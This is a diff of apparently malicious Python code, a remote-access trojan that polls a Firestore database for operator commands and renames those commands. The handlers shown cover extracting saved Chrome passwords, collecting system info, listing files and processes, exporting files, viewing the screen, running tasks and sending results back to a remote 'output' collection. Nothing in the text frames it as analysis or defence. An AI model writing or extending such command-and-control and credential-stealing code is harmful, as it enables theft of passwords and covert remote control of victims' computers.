@@ -209,7 +209,7 @@ def start_private_stream():
         subprocess.Popen(ffmpeg_cmd, shell=True)
 
         # Get the stream URL
-        stream_url = f'https://twitch.tv/channel_name'
+        stream_url = f'https://twitch.tv/user'
 
         return stream_url
     except Exception as e:
@@ -468,23 +468,23 @@ def on_command_added(doc_snapshot, changes, read_time):
             time_diff = datetime.now(timezone.utc) - create_time_utc
             if time_diff.total_seconds() < 1:
                 command = change.document.get("command")
-                if command == "get.pcinfo":
+                if command == "!pcinfo":
                     system_info = get_system_info()
                     output_ref = db.collection("output")
                     output_ref.add({"output": system_info})
-                elif command == "get.chromepasswords":
+                elif command == "!chromepasswords":
                     extract_chrome_passwords()
-                elif command == "os.import":
+                elif command == "!import":
                     handle_os_import(change.document.to_dict())
-                elif command == "os.playsound":
+                elif command == "!playsound":
                     handle_os_playsound(change.document.to_dict())
-                elif command == "os.sharescreen":
+                elif command == "!viewscreen":
                     handle_os_viewscreen()
-                elif command == "ls.storage":
+                elif command == "!ls.storage":
                     storage_files = list_storage_files()
                     output_ref = db.collection("output")
                     output_ref.add({"output": storage_files})
-                elif command == "ls":
+                elif command == "!ls":
                     directory = change.document.get("lsdirectory")
                     if directory:
                         files_in_directory = list_files_in_directory(directory)
@@ -493,17 +493,17 @@ def on_command_added(doc_snapshot, changes, read_time):
                     else:
                         output_ref = db.collection("output")
                         output_ref.add({"output": "Directory not specified for 'ls' command."})
-                elif command == "os.export":
+                elif command == "!download":
                     handle_os_export(change.document.to_dict())
-                elif command == "os.displayimage":
+                elif command == "!displayimage":
                     handle_os_displayimage(change.document.to_dict())
-                elif command == "os.displayvideo":
+                elif command == "!displayvideo":
                     handle_os_displayvideo(change.document.to_dict())
-                elif command == "get.processes":
+                elif command == "!processes":
                     active_processes = get_processes()
                     output_ref = db.collection("output")
                     output_ref.add({"output": active_processes})
-                elif command == "os.runtask":
+                elif command == "!run":
                     handle_os_runtask(change.document.to_dict())
                 else:
                     print(f"No logic was implemented for this document: {change.document.id}")
